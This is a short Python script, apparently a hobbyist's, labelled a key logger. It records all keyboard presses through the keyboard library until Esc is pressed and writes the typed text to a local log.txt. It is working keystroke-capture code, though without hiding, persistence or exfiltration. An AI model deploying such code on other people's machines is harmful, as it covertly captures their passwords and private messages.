#!/usr/bin/env python3

"""
Key Logger

Description: Runs in background. Records all keyboard events, storing them in a text file. Exit program and load into
text file by pressing "esc"

Author: Nic La
Last modified: 19-02-21
"""


import keyboard

file_name = 'log.txt'
event_clean = []

text_file = open(file_name, 'w')
recorded = keyboard.record(until='esc')


for event in recorded:
    event_str = str(event).replace('KeyboardEvent', '')     # convert to str and remove 'KeyboardEvent'
    if 'down' in event_str:     # only record down events, ignore up events
        event_str = event_str[1:-1]     # remove parentheses
        event_str = event_str.replace(' down', '')
        event_str = event_str.replace('space', ' ')
        event_clean.append(event_str)

text_file.write(''.join(event_clean))
text_file.close()

